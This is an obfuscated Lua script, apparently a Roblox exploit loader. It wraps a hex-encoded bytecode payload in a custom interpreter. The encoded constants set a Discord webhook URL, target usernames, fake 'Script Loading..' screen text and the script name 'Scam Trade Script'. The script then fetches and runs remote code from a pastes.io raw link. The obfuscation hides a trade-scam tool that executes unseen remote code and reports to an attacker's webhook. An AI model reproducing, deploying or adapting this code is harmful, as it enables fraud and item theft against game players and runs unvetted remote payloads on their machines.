--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v82=0;while true do if (v82==0) then v19=v0(v3(v30,1,1));return "";end end else local v83=v2(v0(v30,16));if v19 then local v93=v5(v83,v19);v19=nil;return v93;else return v83;end end end);local function v20(v31,v32,v33)if v33 then local v84=0 + 0 ;local v85;while true do if (v84==(0 -0)) then v85=(v31/((879 -(282 + 595))^(v32-(2 -1))))%((2 + 0)^(((v33-(1 -0)) -(v32-(2 -1))) + (1066 -(68 + 997)))) ;return v85-(v85%((1138 -518) -(555 + 64))) ;end end else local v86=931 -(857 + 74) ;local v87;while true do if (v86==((278 -161) -(32 + 85))) then v87=(570 -((547 -(67 + 113)) + 201))^(v32-(1 + 0)) ;return (((v31%(v87 + v87))>=v87) and 1) or (927 -(214 + (1317 -604))) ;end end end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==(3 -2)) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + (2 -1) ;v34=2 -1 ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (3 -1) ;return (v37 * (187 + 69)) + v36 ;end local function v23()local v38=997 -(915 + 82) ;local v39;local v40;local v41;local v42;while true do if (v38==((3 -1) -1)) then return (v42 * (9773502 + 6947683 + 56031)) + (v41 * 65536) + (v40 * (336 -80)) + v39 ;end if (v38==(1187 -((1860 -(368 + 423)) + 118))) then v39,v40,v41,v42=v1(v16,v18,v18 + (6 -3) );v18=v18 + (8 -4) ;v38=1 + (0 -0) ;end end end local function v24()local v43=18 -((1433 -(630 + 793)) + 8) ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(3 -2)) then v46=443 -((1409 -993) + 26) ;v47=(v20(v45,(14 -11) -2 ,20) * (2^(14 + 18))) + v44 ;v43=2;end if (v43==(0 -(0 + 0))) then v44=v23();v45=v23();v43=439 -(145 + 293) ;end if (v43==(433 -((151 -107) + 386))) then if (v48==(1486 -(998 + 488))) then if (v47==((1747 -(760 + 987)) + 0)) then return v49 * (0 + (1913 -(1789 + 124))) ;else v48=773 -(201 + 571) ;v46=1138 -(116 + 1022) ;end elseif (v48==2047) then return ((v47==(0 -0)) and (v49 * ((1 + 0)/(0 -0)))) or (v49 * NaN) ;end return v8(v49,v48-(3632 -(3375 -(745 + 21))) ) * (v46 + (v47/((861 -(814 + 45))^(127 -75)))) ;end if (v43==(1 + 0 + 1)) then v48=v20(v45,8 + 13 ,31);v49=((v20(v45,(2523 -1606) -(261 + 624) )==(1 -0)) and  -1) or (1081 -(1020 + 60)) ;v43=3;end end end local function v25(v50)local v51=0 -0 ;local v52;local v53;while true do if (v51==2) then v53={};for v94=1 + 0 , #v52 do v53[v94]=v2(v1(v3(v52,v94,v94)));end v51=6 -(6 -3) ;end if (v51==(1413 -(447 + (980 -(9 + 5))))) then v52=nil;if  not v50 then v50=v23();if (v50==(0 + 0)) then return "";end end v51=(1432 -(85 + 291)) -(87 + (2233 -(243 + 1022))) ;end if (v51==(702 -(376 + 325))) then v52=v3(v16,v18,(v18 + v50) -((3 -2) -0) );v18=v18 + v50 ;v51=5 -3 ;end if (v51==(13 -10)) then return v6(v53);end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=0 -0 ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v54==(6 -3)) then v61=nil;while true do local v96=0 + 0 ;local v97;while true do if (v96==(939 -(714 + 225))) then v97=0 + 0 ;while true do if (v97==(0 + 0)) then if (v55==0) then local v131=0 -0 ;local v132;local v133;while true do if (v131==0) then v132=0;v133=nil;v131=2 -1 ;end if ((1 -0)==v131) then while true do if (v132==0) then v133=1551 -(1126 + 425) ;while true do if ((0 + 0)==v133) then local v191=0 -0 ;while true do if (v191~=1) then else v133=1;break;end if (v191==0) then v56={};v57={};v191=1;end end end if ((406 -(118 + 287))~=v133) then else v58={};v55=1;break;end end break;end end break;end end end if (v55==3) then local v134=48 -(25 + 23) ;local v135;while true do if (v134==(0 -0)) then v135=0;while true do if (v135==0) then local v181=1121 -(118 + 1003) ;while true do if (v181==(0 -0)) then for v192=1,v23() do v57[v192-1 ]=v28();end return v59;end end end end break;end end end v97=1887 -(927 + 959) ;end if (v97==(3 -2)) then if (v55~=1) then else local v136=732 -(16 + 716) ;local v137;while true do if (v136==(377 -(142 + 235))) then v137=0;while true do if (v137==(4 -3)) then v61={};v55=1 + 1 ;break;end if ((977 -(553 + 424))==v137) then local v182=0 -0 ;local v183;while true do if (v182==(0 + 0)) then v183=0 + 0 ;while true do if (v183==(0 + 0)) then local v194=0;while true do if (v194~=(1 + 0)) then else v183=1;break;end if (v194==(0 + 0)) then v59={v56,v57,nil,v58};v60=v23();v194=1;end end end if (v183==(1 + 0)) then v137=1;break;end end break;end end end end break;end end end if (v55==(9 -7)) then local v138=753 -(239 + 514) ;local v139;while true do if (v138~=(0 + 0)) then else v139=1329 -(797 + 532) ;while true do if ((1 + 0)==v139) then for v186=1 + 0 ,v23() do local v187=0 + 0 ;local v188;local v189;local v190;while true do if (v187==(1 + 0)) then v190=nil;while true do if (0~=v188) then else local v196=0 + 0 ;local v197;while true do if (v196==(0 -0)) then v197=1202 -(373 + 829) ;while true do if (v197~=1) then else v188=1 + 0 ;break;end if (v197~=(731 -(476 + 255))) then else local v211=1130 -(369 + 761) ;while true do if (v211~=(734 -(711 + 22))) then else v197=1 + 0 ;break;end if (v211==(0 -0)) then v189=0 -0 ;v190=nil;v211=1 -0 ;end end end end break;end end end if (v188==(239 -(64 + 174))) then while true do if ((0 -0)==v189) then v190=v21();if (v20(v190,1 + 0 ,1 -0 )~=(336 -(144 + 192))) then else local v205=216 -(42 + 174) ;local v206;local v207;local v208;local v209;local v210;while true do if (0~=v205) then else v206=0 + 0 ;v207=nil;v205=1 + 0 ;end if (v205~=1) then else local v212=0 + 0 ;while true do if (v212==(0 + 0)) then v208=nil;v209=nil;v212=1 + 0 ;end if (v212~=(1505 -(363 + 1141))) then else v205=6 -4 ;break;end end end if (v205==2) then v210=nil;while true do if (v206~=(1581 -(1183 + 397))) then else local v213=406 -(183 + 223) ;while true do if (v213~=(2 -1)) then else v206=2 + 0 ;break;end if (v213==(0 + 0)) then local v218=0 + 0 ;while true do if (v218~=(1976 -(1913 + 62))) then else v213=1 + 0 ;break;end if (v218~=(338 -(118 + 220))) then else v209=nil;v210=nil;v218=1;end end end end end if (v206==(5 -3)) then while true do if (v207~=(1936 -(565 + 1368))) then else if (v20(v209,11 -8 ,1664 -(1477 + 184) )~=(1 -0)) then else v210[4]=v61[v210[4 + 0 ]];end v56[v186]=v210;break;end if (0~=v207) then else local v220=1493 -(711 + 782) ;local v221;while true do if (v220==(856 -(564 + 292))) then v221=0 -0 ;while true do if (v221~=(0 -0)) then else local v230=304 -(244 + 60) ;while true do if ((1819 -(580 + 1239))~=v230) then else v208=v20(v190,2 + 0 ,3 + 0 );v209=v20(v190,480 -(41 + 435) ,6);v230=1002 -(938 + 63) ;end if (v230==(1 + 0)) then v221=1126 -(936 + 189) ;break;end end end if (v221==(1 + 0)) then v207=1;break;end end break;end end end if (v207~=(2 + 0)) then else local v222=1613 -(1565 + 48) ;local v223;while true do if (v222==(1790 -(1010 + 780))) then v223=0 + 0 ;while true do if (v223==(4 -3)) then v207=1141 -(782 + 356) ;break;end if (v223~=(267 -(176 + 91))) then else local v231=1836 -(1045 + 791) ;while true do if (v231==(0 -0)) then if (v20(v209,1,1 -0 )==(1093 -(975 + 117))) then v210[4 -2 ]=v61[v210[2]];end if (v20(v209,1877 -(157 + 1718) ,2 + 0 )~=(1575 -(1281 + 293))) then else v210[10 -7 ]=v61[v210[10 -7 ]];end v231=267 -(28 + 238) ;end if (v231~=(1019 -(697 + 321))) then else v223=1560 -(1381 + 178) ;break;end end end end break;end end end if (v207~=(1 + 0)) then else local v224=0 -0 ;local v225;local v226;while true do if (v224~=(1 + 0)) then else while true do if (v225~=0) then else v226=0;while true do if (v226==1) then v207=2;break;end if (v226==0) then local v232=0 -0 ;local v233;while true do if (0==v232) then v233=0;while true do if (v233~=1) then else v226=1;break;end if ((0 -0)==v233) then v210={v22(),v22(),nil,nil};if (v208==(0 + 0)) then local v238=611 -(602 + 9) ;local v239;while true do if (v238~=(1156 -(1074 + 82))) then else v239=0;while true do if (v239~=0) then else v210[6 -3 ]=v22();v210[1193 -(449 + 740) ]=v22();break;end end break;end end elseif (v208==1) then v210[3]=v23();elseif (v208==2) then v210[875 -(826 + 46) ]=v23() -((949 -(245 + 702))^(1471 -(990 + 465))) ;elseif (v208~=(2 + 1)) then else local v244=0;local v245;local v246;while true do if (v244==0) then v245=0 -0 ;v246=nil;v244=1 + 0 ;end if (v244==(1 + 0)) then while true do if (v245==(1898 -(260 + 1638))) then v246=0 -0 ;while true do if (v246==0) then v210[443 -(382 + 58) ]=v23() -((1728 -(1668 + 58))^(642 -(512 + 114))) ;v210[4]=v22();break;end end break;end end break;end end end v233=3 -2 ;end end break;end end end end break;end end break;end if (v224~=(0 -0)) then else v225=0;v226=nil;v224=1 + 0 ;end end end end break;end if (v206~=(0 -0)) then else local v214=0 -0 ;local v215;while true do if (v214~=(1205 -(902 + 303))) then else v215=0 + 0 ;while true do if (v215==(1 -0)) then v206=2 -1 ;break;end if ((0 + 0)==v215) then local v229=1690 -(1121 + 569) ;while true do if (v229==(215 -(22 + 192))) then v215=684 -(483 + 200) ;break;end if (v229==(1463 -(1404 + 59))) then v207=0 -0 ;v208=nil;v229=1 -0 ;end end end end break;end end end end break;end end end break;end end break;end end break;end if ((765 -(468 + 297))~=v187) then else v188=0 -0 ;v189=nil;v187=563 -(334 + 228) ;end end end v55=829 -(802 + 24) ;break;end if (v139==(0 -0)) then local v184=0;local v185;while true do if (v184==(0 -0)) then v185=0;while true do if ((0 -0)==v185) then local v195=0;while true do if (v195~=(1 + 0)) then else v185=2 -1 ;break;end if (v195~=(0 -0)) then else for v199=1 + 0 ,v60 do local v200=236 -(141 + 95) ;local v201;local v202;local v203;local v204;while true do if (v200==(1 + 0)) then v203=nil;v204=nil;v200=2;end if (v200==(1 + 1)) then while true do if (v201==(1 + 0)) then v204=nil;while true do if ((2 -1)==v202) then if (v203==(2 -1)) then v204=v21()~=(0 + 0) ;elseif (v203==(5 -3)) then v204=v24();elseif (v203==(3 + 0)) then v204=v25();end v61[v199]=v204;break;end if (v202~=(0 + 0)) then else local v217=0 -0 ;while true do if (v217~=(1 + 0)) then else v202=164 -(92 + 71) ;break;end if (v217==(0 + 0)) then v203=v21();v204=nil;v217=1 + 0 ;end end end end break;end if ((0 -0)==v201) then v202=765 -(574 + 191) ;v203=nil;v201=1 + 0 ;end end break;end if (v200~=(0 + 0)) then else v201=0 + 0 ;v202=nil;v200=1;end end end v59[3]=v21();v195=2 -1 ;end end end if (v185==1) then v139=1 + 0 ;break;end end break;end end end end break;end end end break;end end break;end end end break;end if (v54==1) then v57=nil;v58=nil;v54=1435 -(797 + 636) ;end if (v54~=(0 + 0)) then else local v91=0 -0 ;while true do if (v91==(1620 -(1427 + 192))) then v54=1;break;end if (v91==0) then v55=0 + 0 ;v56=nil;v91=2 -1 ;end end end if (v54~=(851 -(254 + 595))) then else local v92=0 + 0 ;while true do if ((127 -(55 + 71))~=v92) then else v54=3 -0 ;break;end if (v92==(1790 -(573 + 1217))) then v59=nil;v60=nil;v92=2 -1 ;end end end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v68=v65;local v69=v66;local v70=v67;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v88=0,v76 do if (v88>=v70) then v74[v88-v70 ]=v75[v88 + 1 ];else v78[v88]=v75[v88 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do v80=v68[v72];v81=v80[1];if (v81<=7) then if (v81<=3) then if (v81<=1) then if (v81>0) then v72=v80[3];else local v103=v80[2];local v104=v78[v80[3]];v78[v103 + 1 ]=v104;v78[v103]=v104[v80[4]];end elseif (v81==2) then v78[v80[2]]();else local v108=0;local v109;local v110;local v111;local v112;while true do if (v108==2) then for v177=v109,v73 do local v178=0;while true do if (v178==0) then v112=v112 + 1 ;v78[v177]=v110[v112];break;end end end break;end if (v108==1) then v73=(v111 + v109) -1 ;v112=0;v108=2;end if (v108==0) then v109=v80[2];v110,v111=v71(v78[v109](v13(v78,v109 + 1 ,v80[3])));v108=1;end end end elseif (v81<=5) then if (v81==4) then v64[v80[3]]=v78[v80[2]];else local v115=0;while true do if (0==v115) then v64[v80[3]]=v78[v80[2]];v72=v72 + 1 ;v80=v68[v72];v115=1;end if (v115==2) then v64[v80[3]]=v78[v80[2]];v72=v72 + 1 ;v80=v68[v72];v115=3;end if (v115==4) then v72=v80[3];break;end if (v115==3) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v115=4;end if (v115==1) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v115=2;end end end elseif (v81==6) then v78[v80[2]]=v64[v80[3]];elseif (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=11) then if (v81<=9) then if (v81==8) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v64[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v72=v80[3];else local v124=0;local v125;while true do if (v124==0) then v125=v80[2];v78[v125]=v78[v125](v13(v78,v125 + 1 ,v73));break;end end end elseif (v81==10) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else do return;end end elseif (v81<=13) then if (v81==12) then v78[v80[2]]=v80[3];else for v129=v80[2],v80[3] do v78[v129]=nil;end end elseif (v81<=14) then v78[v80[2]]=v80[3]~=0 ;elseif (v81>15) then v78[v80[2]][v80[3]]=v80[4];else local v144;local v145,v146;local v147;local v148;v78[v80[2]]=v64[v80[3]];v72=v72 + 1 ;v80=v68[v72];v148=v80[2];v147=v78[v80[3]];v78[v148 + 1 ]=v147;v78[v148]=v147[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3]~=0 ;v72=v72 + 1 ;v80=v68[v72];v148=v80[2];v145,v146=v71(v78[v148](v13(v78,v148 + 1 ,v80[3])));v73=(v146 + v148) -1 ;v144=0;for v174=v148,v73 do v144=v144 + 1 ;v78[v174]=v145[v144];end v72=v72 + 1 ;v80=v68[v72];v148=v80[2];v78[v148]=v78[v148](v13(v78,v148 + 1 ,v73));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]();v72=v72 + 1 ;v80=v68[v72];v72=v80[3];end v72=v72 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!1A3O00028O00026O00084003023O005F4703093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E030B3O0057616974696E6754696D65025O00C07240026O001040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F7061737465732E696F2F7261772F78706B632O7375772O71026O00F03F03083O00557365724E616D6503093O00482O754B686F69303903093O00557365724E616D6532030B3O0047616D655F476F642O3032027O004003093O00466972737454657874030D3O00506C6561736520776169742O2E030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F312O3031353039343832373538363O3832382F4763696C7A6E53586A53356B422O735339376146507564703547666142316953664861715A726455364D2D64632D36487379472O48357253315172413441757364485651030A3O005363726970744E616D6503113O005363616D2054726164652053637269707400483O00120C3O00014O000D000100013O000E070001000200013O0004013O0002000100120C000100013O00260A0001000C000100020004013O000C0001001206000200033O003010000200040005001206000200033O00301000020006000700120C000100083O00260A00010017000100080004013O00170001001206000200093O00120F0003000A3O00202O00030003000B00122O0005000C6O000600016O000300066O00023O00024O00020001000100044O0047000100260A00010026000100010004013O0026000100120C000200013O00260A0002001E0001000D0004013O001E000100120C0001000D3O0004013O0026000100260A0002001A000100010004013O001A000100120C0003000F3O0012050003000E3O00122O000300113O00122O000300103O00122O0002000D3O00044O001A000100260A00010035000100120004013O0035000100120C000200013O00260A0002002D0001000D0004013O002D000100120C000100023O0004013O0035000100260A00020029000100010004013O00290001001206000300033O00300800030013001400122O000300033O00302O00030015001600122O0002000D3O00044O0029000100260A000100050001000D0004013O0005000100120C000200013O00260A0002003F000100010004013O003F000100120C000300183O001204000300173O001206000300033O00301000030019001A00120C0002000D3O00260A000200380001000D0004013O0038000100120C000100123O0004013O000500010004013O003800010004013O000500010004013O004700010004013O000200012O000B3O00017O00",v9(),...);end
